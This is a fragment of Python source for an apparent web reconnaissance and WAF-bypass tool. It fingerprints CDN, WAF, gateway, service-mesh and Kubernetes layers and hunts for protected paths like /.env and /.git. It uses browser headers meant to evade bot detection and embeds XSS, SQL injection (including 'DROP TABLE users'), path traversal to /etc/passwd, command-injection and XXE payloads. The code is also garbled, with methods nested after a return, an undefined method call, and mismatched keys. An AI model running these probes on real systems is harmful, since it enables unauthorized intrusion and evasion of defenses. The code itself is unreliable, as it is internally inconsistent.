            elif mesh_info['mesh_type'] == 'linkerd':
                mesh_info['bypass_vectors'] = [
                    'linkerd_proxy_bypass',
                    'tap_api_abuse',
                    'control_plane_access'
                ]
            
            elif mesh_info['mesh_type'] == 'consul-connect':
                mesh_info['bypass_vectors'] = [
                    'consul_api_access',
                    'service_segmentation_bypass',
                    'intention_manipulation'
                ]
            
            return mesh_info
            
        except Exception as e:
            mesh_info['error'] = str(e)
            return mesh_info

    def _find_next_service(self, service_info: Dict) -> Optional[str]:
        """Intelligent next-hop discovery using multiple detection vectors"""
        next_candidates = set()
        endpoint = service_info.get('endpoint')
        
        if not endpoint:
            return None
        
        try:
            response = self._safe_request('GET', endpoint, timeout=5)
            if not response:
                return None
            
            headers = {k.lower(): v.lower() for k, v in response.headers.items()}
            
            # Method 1: Direct forwarding headers
            forwarding_headers = [
                'x-forwarded-to', 'x-upstream-server', 'x-backend-server',
                'x-real-backend', 'x-upstream-addr', 'x-forwarded-host'
            ]
            
            for header_name, header_value in headers.items():
                if any(fwd_header in header_name for fwd_header in forwarding_headers):
                    # Extract URL or hostname from header
                    if '://' in header_value:
                        next_candidates.add(header_value)
                    elif ':' in header_value:  # hostname:port
                        parsed_current = urlparse(endpoint)
                        next_url = f"{parsed_current.scheme}://{header_value}"
                        next_candidates.add(next_url)
            
            # Method 2: Service mesh upstream discovery
            if service_info.get('service_mesh_info', {}).get('config_access'):
                mesh_endpoints = service_info['service_mesh_info']['config_access']
                
                if '/clusters' in mesh_endpoints:
                    parsed_url = urlparse(endpoint)
                    clusters_url = urljoin(f"{parsed_url.scheme}://{parsed_url.netloc}", '/clusters')
                    clusters_response = self._safe_request('GET', clusters_url, timeout=3)
                    
                    if clusters_response:
                        # Parse Envoy cluster config for upstream services
                        cluster_text = clusters_response.text
                        upstream_matches = re.findall(r'outbound\|\d+\|\|([^:]+)', cluster_text)
                        
                        for upstream in upstream_matches:
                            if upstream != parsed_url.hostname:  # Avoid self-reference
                                next_url = f"{parsed_url.scheme}://{upstream}"
                                next_candidates.add(next_url)
            
            # Method 3: API response analysis for service references
            response_text = response.text
            
            # Look for API endpoints in responses (JSON APIs often reference other services)
            api_url_patterns = [
                r'"[a-zA-Z_]+_url":\s*"(https?://[^"]+)"',
                r'"[a-zA-Z_]+_endpoint":\s*"(https?://[^"]+)"',
                r'"service_url":\s*"(https?://[^"]+)"'
            ]
            
            for pattern in api_url_patterns:
                matches = re.findall(pattern, response_text)
                for match in matches:
                    if match != endpoint:  # Avoid self-reference
                        next_candidates.add(match)
            
            # Method 4: DNS-based service discovery
            parsed_url = urlparse(endpoint)
            if parsed_url.hostname:
                # Try common service discovery patterns
                hostname_parts = parsed_url.hostname.split('.')
                if len(hostname_parts) > 1:
                    # Try different service variations
                    service_variations = [
                        f"api.{'.'.join(hostname_parts[1:])}",
                        f"backend.{'.'.join(hostname_parts[1:])}",
                        f"internal.{'.'.join(hostname_parts[1:])}",
                        f"service.{'.'.join(hostname_parts[1:])}"
                    ]
                    
                    for variation in service_variations:
                        try:
                            # Quick DNS resolution check
                            socket.gethostbyname(variation)
                            next_url = f"{parsed_url.scheme}://{variation}"
                            if next_url != endpoint:
                                next_candidates.add(next_url)
                        except socket.gaierror:
                            continue
            
            # Method 5: Container orchestration service discovery
            container_info = service_info.get('container_info', {})
            if container_info.get('orchestrator') == 'kubernetes':
                # Try Kubernetes internal service patterns
                if '.svc.cluster.local' in parsed_url.hostname:
                    parts = parsed_url.hostname.split('.')
                    if len(parts) >= 3:
                        namespace = parts[1]
                        # Try common service names in the same namespace
                        common_services = ['api', 'backend', 'database', 'cache', 'auth']
                        for service_name in common_services:
                            k8s_url = f"{parsed_url.scheme}://{service_name}.{namespace}.svc.cluster.local"
                            if k8s_url != endpoint:
                                next_candidates.add(k8s_url)
            
            # Return the first valid candidate after basic validation
            for candidate in next_candidates:
                if self._validate_next_hop(candidate):
                    return candidate
            
            return None
            
        except Exception as e:
            return None

    # Helper methods for advanced detection
    def _safe_request(self, method: str, url: str, timeout: int = 5, **kwargs) -> Optional[requests.Response]:
        """Safe HTTP request with error handling"""
        try:
            response = self.session.request(method, url, timeout=timeout, verify=False, **kwargs)
            return response
        except Exception:
            return None

    def _is_rest_api(self, endpoint: str) -> bool:
        """Detect if endpoint is a REST API"""
        try:
            response = self._safe_request('OPTIONS', endpoint, timeout=3)
            if response and 'allow' in response.headers:
                allowed_methods = response.headers['allow'].upper()
                rest_methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
                return sum(1 for method in rest_methods if method in allowed_methods) >= 3
        except:
            pass
        return False

    def _is_graphql(self, endpoint: str) -> bool:
        """Detect GraphQL endpoint"""
        try:
            # Try GraphQL introspection query
            graphql_query = {"query": "{ __schema { types { name } } }"}
            response = self._safe_request('POST', endpoint, json=graphql_query, timeout=3)
            
            if response and response.status_code == 200:
                response_data = response.json()
                return '__schema' in str(response_data)
                
            # Also check for GraphQL-specific paths
            parsed_url = urlparse(endpoint)
            graphql_paths = ['/graphql', '/graphiql', '/api/graphql']
            return any(path in parsed_url.path for path in graphql_paths)
        except:
            pass
        return False

    def _supports_websocket(self, endpoint: str) -> bool:
        """Check WebSocket support"""
        try:
            headers = {
                'Connection': 'Upgrade',
                'Upgrade': 'websocket',
                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                'Sec-WebSocket-Version': '13'
            }
            response = self._safe_request('GET', endpoint, headers=headers, timeout=3)
            return response and response.status_code == 101
        except:
            pass
        return False

    def _validate_next_hop(self, candidate_url: str) -> bool:
        """Validate if candidate URL is accessible and different service"""
        try:
            response = self._safe_request('HEAD', candidate_url, timeout=3)
            return response and response.status_code < 500
        except:
            return False

class ServiceMeshDetector:
    def __init__(self):
        self.mesh_signatures = {
            'istio': ['x-istio-attributes', 'x-envoy', 'x-b3-traceid'],
            'linkerd': ['l5d-dst-service', 'l5d-dst-client'],
            'consul': ['x-consul-token', 'x-consul-index'],
            'traefik': ['x-traefik-router', 'x-traefik-service']
        }

    def detect_mesh(self, headers: Dict, response_info: Dict) -> Dict:
        mesh_data = {
            'type': None,
            'version': None,
            'routing_info': {},
            'metadata': {}
        }
        for mesh_type, signatures in self.mesh_signatures.items():
            if any(sig in str(headers) for sig in signatures):
                mesh_data['type'] = mesh_type
                mesh_data['metadata'] = self._extract_mesh_metadata(mesh_type, headers)
                break
        return mesh_data

    def _extract_mesh_metadata(self, mesh_type: str, headers: Dict) -> Dict:
        metadata = {}
        if mesh_type == 'istio':
            metadata['trace_id'] = headers.get('x-b3-traceid')
            metadata['request_id'] = headers.get('x-request-id')
        elif mesh_type == 'linkerd':
            metadata['dst_service'] = headers.get('l5d-dst-service')
            metadata['dst_client'] = headers.get('l5d-dst-client')
        return metadata

class RequestTracker:
    def __init__(self):
        self.transformations = []

    def track_request(self, request_id: str, layer: str, request_data: Dict) -> Dict:
        transformation = {
            'request_id': request_id,
            'layer': layer,
            'timestamp': datetime.utcnow(),
            'headers': request_data.get('headers', {}),
            'payload': request_data.get('payload', {}),
            'mutations': self._analyze_mutations(request_data)
        }
        self.transformations.append(transformation)
        return transformation

    def _analyze_mutations(self, request_data: Dict) -> Dict:
        return {
            'headers_changed': self._detect_header_changes(request_data),
            'payload_modified': self._detect_payload_changes(request_data),
            'encoding_changes': self._detect_encoding_changes(request_data)
        }

    def _detect_header_changes(self, request_data: Dict) -> List[str]:
        return []

    def _detect_payload_changes(self, request_data: Dict) -> bool:
        return False

    def _detect_encoding_changes(self, request_data: Dict) -> List[str]:
        return []

class PayloadAnalyzer:
    def __init__(self):
        self.mutation_types = ['encoding', 'structure', 'content']

    def analyze_mutations(self, original_payload: Dict, modified_payload: Dict) -> Dict:
        mutations = {
            'type': [],
            'changes': [],
            'severity': 'low'
        }
        if self._check_structural_changes(original_payload, modified_payload):
            mutations['type'].append('structural')
            mutations['severity'] = 'high'
        encoding_changes = self._check_encoding_changes(original_payload, modified_payload)
        if encoding_changes:
            mutations['type'].append('encoding')
            mutations['changes'].extend(encoding_changes)
        return mutations

    def _check_structural_changes(self, original: Dict, modified: Dict) -> bool:
        return False

    def _check_encoding_changes(self, original: Dict, modified: Dict) -> List[str]:
        return []

class StackHandler:
    def __init__(self):
        self.known_stacks = {
            'cloudflare_nginx': {
                'waf_headers': ['cf-ray', 'cf-cache-status'],
                'proxy_headers': ['x-real-ip', 'x-forwarded-for']
            },
            'aws_waf_apache': {
                'waf_headers': ['x-amzn-trace-id'],
                'proxy_headers': ['x-forwarded-proto']
            }
        }

    def handle_request(self, stack_type: str, request_data: Dict) -> Dict:
        if stack_type in self.known_stacks:
            return self._process_stack_specific(stack_type, request_data)
        return request_data

    def _process_stack_specific(self, stack_type: str, request_data: Dict) -> Dict:
        stack_config = self.known_stacks[stack_type]
        processed_data = request_data.copy()
        # Placeholder for stack-specific logic
        return processed_data

class CommandGenerator:
    def __init__(self, request_data: Dict):
        self.request_data = request_data

    def _ensure_serializable(self, data):
        if isinstance(data, bytes):
            try:
                return data.decode('utf-8')
            except UnicodeDecodeError:
                return base64.b64encode(data).decode('utf-8')
        elif isinstance(data, dict):
            return {k: self._ensure_serializable(v) for k, v in data.items()}
        elif isinstance(data, list):
            return [self._ensure_serializable(item) for item in data]
        return data

    def generate_curl(self) -> str:
        cmd = ['curl']
        for header, value in self.request_data.get('headers', {}).items():
            cmd.append(f'-H "{header}: {value}"')
        if 'payload' in self.request_data:
            serializable_payload = self._ensure_serializable(self.request_data['payload'])
            cmd.append(f"-d '{json.dumps(serializable_payload)}'")
        cmd.append(f"'{self.request_data['url']}'")
        return ' '.join(cmd)

    def generate_python(self) -> str:
        code = [
            'import requests',
            'import json',
            '',
            f"url = '{self.request_data['url']}'",
            f"headers = {json.dumps(self.request_data.get('headers', {}), indent=2)}",
        ]
        if 'payload' in self.request_data:
            # Utilizziamo _ensure_serializable per gestire i dati binari
            serializable_payload = self._ensure_serializable(self.request_data['payload'])
            code.append(f"payload = {json.dumps(serializable_payload, indent=2)}")
            code.append('')
            code.append('response = requests.post(url, headers=headers, json=payload)')
        else:
            code.append('')
            code.append('response = requests.get(url, headers=headers)')
        return '\n'.join(code)

    def log_discovery(self, layer, discovery_type, details):
        """Log discoveries with structured data"""
        timestamp = time.strftime('%H:%M:%S')
        print(f"[{timestamp}] 🔍 {layer} - {discovery_type}: {details}")

        if layer not in self.chain_map['fingerprints']:
            self.chain_map['fingerprints'][layer] = {}
        self.chain_map['fingerprints'][layer][discovery_type] = details

    def generate_unique_markers(self):
        """Generate unique markers for request tracking"""
        return {
            'uuid': ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)),
            'timestamp': str(int(time.time())),
            'sequence': str(random.randint(100000, 999999))
        }

    def find_forbidden_endpoint(self):
        """Find an endpoint that returns 403/401 for bypass testing"""
        print("\n🔍 Phase 0: Finding Forbidden Endpoint for Testing")

        # Browser-like headers per evitare detection WAF/anti-bot
        browser_headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'it,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }

        # If specified by user, verify it's actually forbidden
        if self.forbidden_endpoint:
            try:
                # Per cross-domain, aggiungere Referer
                test_headers = browser_headers.copy()
                forbidden_parsed = urlparse(self.forbidden_endpoint)
                if forbidden_parsed.netloc != self.parsed_url.netloc:
                    test_headers['Referer'] = self.target_url

                response = self.session.get(self.forbidden_endpoint, headers=test_headers, timeout=10)
                if response.status_code in [401, 403, 302]:
                    self.discovered_forbidden_endpoint = self.forbidden_endpoint
                    self.log_discovery("Setup", "Forbidden Endpoint", f"User-provided: {self.forbidden_endpoint} ({response.status_code})")
                    return self.forbidden_endpoint
                else:
                    print(f"  ⚠️ Provided endpoint returned {response.status_code}, not 403/401. Searching for alternatives...")
            except Exception as e:
                print(f"  ⚠️ Error checking provided endpoint: {e}")

        # Search for common protected endpoints
        common_protected = [
            '/admin', '/wp-admin', '/administrator', '/secure', '/api/admin',
            '/manage', '/console', '/portal', '/control', '/private',
            '/restricted', '/staff', '/backend', '/cpanel', '/webadmin',
            '/.env', '/.git', '/config', '/phpmyadmin', '/adminer'
        ]

        for endpoint in common_protected:
            try:
                url = self.target_url + endpoint
                response = self.session.get(url, headers=browser_headers, timeout=10, allow_redirects=False)
                if response.status_code in [401, 403]:
                    self.discovered_forbidden_endpoint = url
                    self.log_discovery("Setup", "Forbidden Endpoint Found", f"{endpoint} ({response.status_code})")
                    return url
            except:
                continue

        # If no forbidden endpoint found
        if not self.skip_forbidden_tests:
            print("  ⚠️ No forbidden endpoint found - some bypass tests will be limited")
            print("  💡 Tip: Use --forbidden-endpoint to specify one, or --skip-forbidden-tests to skip these tests")

        return None

        def create_fingerprint_payloads(self):
            """Create payloads to fingerprint unlimited layers in the chain"""
            markers = self.generate_unique_markers()
            
            # Sistema di detection esteso per tutti i possibili layer
            return {
                # Layer 1: Edge/CDN Detection
                'edge_cdn_detection': {
                    'priority': 1,
                    'headers': {
                        'X-CDN-Test': markers['uuid'],
                        'Cache-Control': 'no-cache, no-store, must-revalidate',
                        'Pragma': 'no-cache',
                        'X-Edge-Test': markers['sequence'],
                        'CF-Connecting-IP': f'127.0.0.1',  # Test Cloudflare
                        'X-Forwarded-Proto': 'https',
                        'X-Original-URL': f'/test-{markers["uuid"]}'
                    },
                    'expected_responses': [
                        'cloudflare', 'cloudfront', 'fastly', 'akamai', 'maxcdn',
                        'keycdn', 'bunnycdn', 'stackpath', 'quantil'
                    ],
                    'detection_headers': [
                        'cf-ray', 'x-amz-cf-id', 'x-served-by', 'x-cache',
                        'x-edge-location', 'x-cdn-pop'
                    ],
                    'timing_analysis': True,
                    'geo_routing_test': True
                },

                # Layer 2: DDoS Protection Detection  
                'ddos_protection_detection': {
                    'priority': 2,
                    'headers': {
                        'X-DDoS-Test': markers['uuid'],
                        'User-Agent': f'SecurityTest-{markers["sequence"]}',
                        'X-Rate-Limit-Test': markers['uuid']
                    },
                    'rate_limit_tests': {
                        'burst_requests': 50,
                        'time_window': 10,
                        'escalation_pattern': [1, 5, 10, 25, 50]
                    },
                    'challenge_detection': [
                        'cloudflare_challenge', 'incapsula_challenge', 'sucuri_firewall',
                        'akamai_bot_manager', 'imperva_challenge'
                    ],
                    'js_challenge_markers': [markers['uuid']],
                    'captcha_detection': True
                },

                # Layer 3: WAF Detection (Multi-vendor)
                'waf_detection': {
                    'priority': 3,
                    'payloads': {
                        'xss_tests': [
                            f"/?xss=<script>alert('{markers['uuid']}')</script>",
                            f"/?xss=javascript:alert('{markers['uuid']}')",
                            f"/?xss=<img src=x onerror=alert('{markers['uuid']}')>",
                            f"/?xss=<svg onload=alert('{markers['uuid']}')>"
                        ],
                        'sqli_tests': [
                            f"/?sql=' OR 1=1 -- {markers['uuid']}",
                            f"/?sql=' UNION SELECT '{markers['uuid']}' --",
                            f"/?sql=1'; DROP TABLE users; -- {markers['uuid']}",
                            f"/?sql=1' AND SLEEP(5) -- {markers['uuid']}"
                        ],
                        'lfi_tests': [
                            f"/?file=../../../etc/passwd#{markers['uuid']}",
                            f"/?file=....//....//....//etc/passwd#{markers['uuid']}",
                            f"/?file=/etc/passwd%00{markers['uuid']}",
                            f"/?file=php://filter/resource=index.php#{markers['uuid']}"
                        ],
                        'rce_tests': [
                            f"/?cmd=id;echo {markers['uuid']}",
                            f"/?cmd=`id`;echo {markers['uuid']}",
                            f"/?cmd=$(id);echo {markers['uuid']}",
                            f"/?cmd=|id;echo {markers['uuid']}"
                        ],
                        'xxe_tests': [
                            f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test "{markers['uuid']}">]><root>&test;</root>""",
                            f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;{markers['uuid']}</root>"""
                        ]
                    },
                    'waf_signatures': {
                        'cloudflare': ['cf-ray', 'cloudflare', 'ray id'],
                        'aws_waf': ['x-amzn-trace-id', 'x-amzn-requestid'],
                        'akamai': ['akamai', 'ak-', 'x-akamai'],
                        'imperva': ['incap_ses', 'visid_incap', 'imperva'],
                        'f5_asm': ['f5-bigip', 'bigip', 'f5'],
                        'barracuda': ['barra', 'cuda'],
                        'sucuri': ['sucuri', 'x-sucuri'],
                        'fortinet': ['fortigate', 'fortiweb'],
                        'citrix': ['netscaler', 'citrix'],
                        'modsecurity': ['mod_security', 'modsec']
                    },
                    'headers': {
                        'User-Agent': f'Mozilla/5.0 (WAF-Test-{markers["uuid"]})',
                        'X-WAF-Test': markers['uuid'],
                        'X-Attack-Test': markers['sequence']
                    }
                },

                # Layer 4: API Gateway Detection
                'api_gateway_detection': {
                    'priority': 4,
                    'headers': {
                        'X-API-Gateway-Test': markers['uuid'],
                        'Authorization': f'Bearer test-{markers["sequence"]}',
                        'X-API-Key': f'test-key-{markers["uuid"]}',
                        'X-Client-ID': markers['uuid']
                    },
                    'api_tests': {
                        'rate_limiting': {
                            'requests_per_second': [1, 5, 10, 50, 100],
                            'burst_patterns': [10, 20, 50, 100]
                        },
                        'auth_mechanisms': [
                            'bearer_token', 'api_key', 'oauth2', 'jwt', 'basic_auth'
                        ],
                        'routing_tests': [
                            f'/api/v1/test-{markers["uuid"]}',
                            f'/api/v2/test-{markers["uuid"]}',
                            f'/graphql?query={{test(id:"{markers["uuid"]}")}}',
                            f'/rest/test/{markers["uuid"]}',
                            f'/gateway/test/{markers["uuid"]}'
                        ]
                    },
                    'gateway_signatures': {
                        'kong': ['x-kong', 'kong-'],
                        'zuul': ['x-zuul', 'zuul-'],
                        'ambassador': ['x-ambassador'],
                        'istio': ['x-envoy', 'istio-'],
                        'aws_api_gateway': ['x-amzn-requestid', 'x-amz-apigw'],
                        'azure_apim': ['x-ms-request-id', 'apim-'],
                        'google_cloud': ['x-goog-', 'x-cloud-']
                    },
                    'response_analysis': {
                        'json_structure': True,
                        'error_formats': True,
                        'cors_headers': True
                    }
                },

                # Layer 5: Load Balancer Detection
                'load_balancer_detection': {
                    'priority': 5,
                    'headers': {
                        'X-LB-Test': markers['uuid'],
                        'X-Session-Test': markers['sequence'],
                        'Connection': 'keep-alive'
                    },
                    'lb_tests': {
                        'session_persistence': {
                            'cookie_tests': ['JSESSIONID', 'AWSALB', 'server-id'],
                            'ip_hash_tests': True,
                            'header_based_routing': ['X-User-Type', 'X-Version']
                        },
                        'health_checks': [
                            f'/health?test={markers["uuid"]}',
                            f'/lb-status?test={markers["uuid"]}',
                            f'/haproxy?stats&test={markers["uuid"]}'
                        ],
                        'backend_detection': {
                            'multiple_requests': 20,
                            'response_variation_analysis': True,
                            'server_header_analysis': True
                        }
                    },
                    'lb_signatures': {
                        'haproxy': ['haproxy', 'x-haproxy'],
                        'nginx': ['nginx', 'x-nginx'],
                        'aws_alb': ['awsalb', 'x-amzn-trace-id'],
                        'f5_bigip': ['f5-bigip', 'bigip'],
                        'citrix': ['netscaler', 'citrix'],
                        'traefik': ['traefik', 'x-traefik']
                    }
                },

                # Layer 6: Service Mesh Detection
                'service_mesh_detection': {
                    'priority': 6,
                    'headers': {
                        'X-Service-Mesh-Test': markers['uuid'],
                        'X-Trace-Test': markers['sequence'],
                        'X-B3-TraceId': markers['uuid'],
                        'X-B3-SpanId': markers['sequence']
                    },
                    'mesh_tests': {
                        'sidecar_detection': {
                            'admin_endpoints': [
                                f'/stats?test={markers["uuid"]}',
                                f'/config_dump?test={markers["uuid"]}',
                                f'/clusters?test={markers["uuid"]}',
                                f'/server_info?test={markers["uuid"]}'
                            ],
                            'envoy_specific': True,
                            'istio_specific': True
                        },
                        'mtls_detection': {
                            'cert_headers': ['x-forwarded-client-cert'],
                            'tls_version_tests': True
                        },
                        'traffic_policies': {
                            'circuit_breaker_tests': True,
                            'retry_policy_tests': True,
                            'timeout_tests': [1, 5, 10, 30]
                        }
                    },
                    'mesh_signatures': {
                        'istio_envoy': ['x-envoy', 'istio', 'x-b3-'],
                        'linkerd': ['l5d-', 'linkerd'],
                        'consul_connect': ['x-consul'],
                        'traefik_mesh': ['x-traefik']
                    }
                },

                # Layer 7: Container Orchestration Detection
                'container_detection': {
                    'priority': 7,
                    'headers': {
                        'X-Container-Test': markers['uuid'],
                        'X-K8s-Test': markers['sequence'],
                        'X-Docker-Test': markers['uuid']
                    },
                    'container_tests': {
                        'kubernetes': {
                            'service_discovery': [
                                'service.namespace.svc.cluster.local',
                                'internal.service.discovery'
                            ],
                            'endpoints': [
                                f'/metrics?test={markers["uuid"]}',
                                f'/healthz?test={markers["uuid"]}',
                                f'/readyz?test={markers["uuid"]}',
                                f'/livez?test={markers["uuid"]}'
                            ],
                            'dns_patterns': ['.svc.cluster.local', '.internal']
                        },
                        'docker_swarm': {
                            'service_discovery': ['tasks.service-name'],
                            'overlay_networks': True
                        },
                        'ecs_fargate': {
                            'task_metadata': [
                                f'/v2/metadata?test={markers["uuid"]}',
                                f'/v2/stats?test={markers["uuid"]}'
                            ],
                            'aws_specific': True
                        }
                    },
                    'container_signatures': {
                        'kubernetes': ['x-kubernetes', 'x-k8s', 'x-pod-name'],
                        'docker': ['x-docker', 'x-container-id'],
                        'ecs': ['x-ecs-task', 'x-amzn-trace-id'],
                        'openshift': ['x-openshift']
                    }
                },

                # Layer 8: Application Runtime Detection
                'runtime_detection': {
                    'priority': 8,
                    'headers': {
                        'X-Runtime-Test': markers['uuid'],
                        'X-Framework-Test': markers['sequence']
                    },
                    'runtime_tests': {
                        'language_detection': {
                            'java': [
                                f'/actuator/health?test={markers["uuid"]}',
                                f'/jolokia?test={markers["uuid"]}',
                                f'/hawtio?test={markers["uuid"]}'
                            ],
                            'nodejs': [
                                f'/debug?test={markers["uuid"]}',
                                f'/status?test={markers["uuid"]}'
                            ],
                            'python': [
                                f'/debug?test={markers["uuid"]}',
                                f'/__debug__?test={markers["uuid"]}'
                            ],
                            'dotnet': [
                                f'/health?test={markers["uuid"]}',
                                f'/info?test={markers["uuid"]}'
                            ],
                            'php': [
                                f'/phpinfo.php?test={markers["uuid"]}',
                                f'/info.php?test={markers["uuid"]}'
                            ]
                        },
                        'framework_detection': {
                            'spring_boot': ['/actuator/', '/management/'],
                            'express_js': ['/api/', '/debug/'],
                            'django': ['/__debug__/', '/admin/'],
                            'flask': ['/debug/', '/status/'],
                            'laravel': ['/telescope/', '/horizon/']
                        }
                    },
                    'runtime_signatures': {
                        'java': ['java', 'jvm', 'spring', 'tomcat', 'jetty'],
                        'nodejs': ['node', 'express', 'v8'],
                        'python': ['python', 'django', 'flask', 'wsgi'],
                        'dotnet': ['asp.net', 'iis', '.net'],
                        'php': ['php', 'apache', 'nginx-php']
                    }
                },

                # Layer 9: Database/Storage Detection
                'database_detection': {
                    'priority': 9,
                    'headers': {
                        'X-Database-Test': markers['uuid'],
                        'X-Storage-Test': markers['sequence']
                    },
                    'db_tests': {
                        'database_proxies': [
                            f'/db-status?test={markers["uuid"]}',
                            f'/pgbouncer?test={markers["uuid"]}',
                            f'/mysql-proxy?test={markers["uuid"]}'
                        ],
                        'cache_layers': [
                            f'/redis-info?test={markers["uuid"]}',
                            f'/memcached-stats?test={markers["uuid"]}',
                            f'/cache-status?test={markers["uuid"]}'
                        ],
                        'storage_apis': [
                            f'/api/storage?test={markers["uuid"]}',
                            f'/s3-status?test={markers["uuid"]}',
                            f'/blob-storage?test={markers["uuid"]}'
                        ]
                    },
                    'db_signatures': {
                        'redis': ['redis', 'x-redis'],
                        'memcached': ['memcached', 'x-memcached'],
                        'postgresql': ['postgresql', 'postgres', 'pgbouncer'],
                        'mysql': ['mysql', 'mariadb'],
                        'mongodb': ['mongodb', 'mongo'],
                        's3_compatible': ['s3', 'minio', 'ceph']
                    }
                },

                # Layer 10: Serverless/Function Detection
                'serverless_detection': {
                    'priority': 10,
                    'headers': {
                        'X-Serverless-Test': markers['uuid'],
                        'X-Function-Test': markers['sequence']
                    },
                    'serverless_tests': {
                        'cold_start_analysis': {
                            'timing_tests': True,
                            'initialization_detection': True
                        },
                        'execution_context': {
                            'memory_limits': True,
                            'timeout_detection': True,
                            'concurrent_execution': True
                        },
                        'event_sources': [
                            'api_gateway', 'sqs', 's3', 'dynamodb', 'eventbridge'
                        ]
                    },
                    'serverless_signatures': {
                        'aws_lambda': ['x-amzn-requestid', 'lambda'],
                        'azure_functions': ['x-ms-invocation-id'],
                        'google_functions': ['function-execution-id'],
                        'vercel': ['x-vercel-'],
                        'netlify': ['x-nf-']
                    }
                },

                # Sistema di analisi dinamica per layer aggiuntivi
                'dynamic_layer_detection': {
                    'priority': 99,
                    'adaptive_testing': True,
                    'layer_chaining_analysis': True,
                    'response_correlation': True,
                    'timing_fingerprinting': True,
                    'behavioral_analysis': True,
                    'unknown_component_detection': {
                        'header_pattern_analysis': True,
                        'response_pattern_analysis': True,
                        'timing_pattern_analysis': True,
                        'error_pattern_analysis': True
                    }
                }
            }

        def execute_layer_detection(self, target_url: str, max_layers: int = 15):
            """Execute detection for unlimited layers"""
            detected_layers = []
            fingerprint_payloads = self.create_comprehensive_fingerprint_payloads()
            
            # Ordina i test per priorità
            sorted_tests = sorted(
                fingerprint_payloads.items(), 
                key=lambda x: x[1].get('priority', 99)
            )
            
            for layer_name, layer_config in sorted_tests:
                if len(detected_layers) >= max_layers:
                    break
                    
                print(f"[*] Testing Layer {len(detected_layers) + 1}: {layer_name}")
                
                layer_result = self.test_layer(target_url, layer_name, layer_config)
                
                if layer_result['detected']:
                    detected_layers.append({
                        'layer_number': len(detected_layers) + 1,
                        'layer_type': layer_name,
                        'details': layer_result,
                        'bypass_vectors': self.generate_layer_bypasses(layer_result)
                    })
                    
                    # Analisi dinamica per layer successivi
                    if layer_result.get('next_hop_hints'):
                        additional_tests = self.generate_dynamic_tests(layer_result)
                        fingerprint_payloads.update(additional_tests)
            
            return {
                'total_layers': len(detected_layers),
                'layer_chain': detected_layers,
                'bypass_strategies': self.generate_chain_bypasses(detected_layers),
                'reconnaissance_data': self.compile_intelligence(detected_layers)
            }

        def test_layer(self, target_url: str, layer_name: str, layer_config: dict) -> dict:
            """Test specifico per un layer con analisi completa"""
            results = {
                'detected': False,
                'confidence': 0.0,
                'signatures_found': [],
                'response_analysis': {},
                'timing_analysis': {},
                'next_hop_hints': []
            }
            
            # Esegui tutti i test per questo layer
            if 'headers' in layer_config:
                header_results = self.test_headers(target_url, layer_config['headers'])
                results['response_analysis']['headers'] = header_results
                
            if 'payloads' in layer_config:
                payload_results = self.test_payloads(target_url, layer_config['payloads'])
                results['response_analysis']['payloads'] = payload_results
                
            # Analisi timing per detection accurata
            if layer_config.get('timing_analysis'):
                timing_results = self.perform_timing_analysis(target_url, layer_config)
                results['timing_analysis'] = timing_results
                
            # Calcola confidenza basata su tutti i risultati
            results['confidence'] = self.calculate_detection_confidence(results)
            results['detected'] = results['confidence'] > 0.6
            
            return results

        def generate_dynamic_tests(self, layer_result: dict) -> dict:
            """Genera test dinamici basati sui risultati del layer precedente"""
            dynamic_tests = {}
            
            # Se abbiamo trovato hint per layer successivi
            if layer_result.get('next_hop_hints'):
                for hint in layer_result['next_hop_hints']:
                    test_name = f"dynamic_{hint['type']}_detection"
                    dynamic_tests[test_name] = {
                        'priority': hint.get('priority', 50),
                        'headers': hint.get('headers', {}),
                        'payloads': hint.get('payloads', []),
                        'signatures': hint.get('signatures', {})
                    }
            
            return dynamic_tests

    async def protocol_discovery(self):
        """Discover supported protocols"""
        print("\n🔍 Phase 1: Protocol Discovery")

        # HTTP/2 Detection
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.target_url) as response:
                    if hasattr(response, 'version') and response.version.major >= 2:
                        self.protocols['http2'] = True
                        self.log_discovery("Protocol", "HTTP/2", "Supported")
        except:
            pass

        # HTTP/3 Detection (via Alt-Svc header)
        try:
            response = self.session.head(self.target_url)
            alt_svc = response.headers.get('Alt-Svc', '')
            if 'h3' in alt_svc or 'h3-29' in alt_svc:
                self.protocols['http3'] = True
                self.log_discovery("Protocol", "HTTP/3", f"Detected via Alt-Svc: {alt_svc}")
        except:
            pass

        # WebSocket Detection
        try:
            ws_headers = {
                'Upgrade': 'websocket',
                'Connection': 'Upgrade',
                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                'Sec-WebSocket-Version': '13'
            }
            response = self.session.get(self.target_url, headers=ws_headers)
            if response.status_code == 101:
                self.protocols['websocket'] = True
                self.log_discovery("Protocol", "WebSocket", "Upgrade supported")
        except:
            pass

    def infrastructure_fingerprinting(self):
        """Fingerprint infrastructure components"""
        print("\n🔍 Phase 2: Infrastructure Fingerprinting")

        fingerprints = self.create_fingerprint_payloads()

        # CDN Detection
        try:
            response = self.session.get(self.target_url, headers=fingerprints['cdn_detection']['headers'])

            # Analyze response headers for CDN signatures
            cdn_indicators = {
                'cloudflare': ['cf-ray', 'cf-cache-status', 'server.*cloudflare'],
                'cloudfront': ['x-amz-cf', 'x-cache.*cloudfront'],
                'fastly': ['fastly-debug', 'x-served-by.*fastly'],
                'akamai': ['akamai-origin-hop', 'x-akamai'],
                'incapsula': ['x-iinfo', 'incap_ses'],
                'sucuri': ['x-sucuri', 'server.*sucuri']
            }

            detected_cdn = None
            for cdn, indicators in cdn_indicators.items():
                for indicator in indicators:
                    for header, value in response.headers.items():
                        if re.search(indicator, f"{header}: {value}", re.IGNORECASE):
                            detected_cdn = cdn
                            break
                if detected_cdn:
                    break

            if detected_cdn:
                self.log_discovery("CDN", "Detection", detected_cdn)
                self.chain_map['layers'].append(f"CDN-{detected_cdn}")

